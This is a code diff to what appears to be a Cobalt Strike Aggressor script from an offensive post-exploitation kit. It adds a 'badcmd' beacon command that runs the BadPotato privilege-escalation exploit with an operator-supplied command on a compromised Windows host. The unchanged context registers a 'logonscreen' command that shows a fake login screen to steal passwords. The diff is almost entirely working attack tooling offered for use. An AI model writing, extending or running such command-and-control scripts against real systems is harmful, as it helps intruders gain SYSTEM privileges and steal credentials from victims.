@@ -58,3 +58,22 @@ beacon_command_register(
     "logonscreen",
     "pop a fake logonscreen to steal password",
     "");
+
+alias badcmd{
+    if($2 eq ""){
+        btask($1,"Usage: badcmd [command]");
+        return;
+    }
+    $args = "";
+    @args_list = sublist(@_, 1);
+    foreach $arg (@args_list){
+        $args .= $arg . " ";
+    }
+    $cmd = "\"".replace($args, "\"", "\\\"")."\"";
+    bexecute_assembly($1, script_resource("post/BadPotato.exe"), $cmd);
+}
+
+beacon_command_register(
+    "badcmd",
+    "execute command use badpotato",
+    "Usage: badcmd [command]");
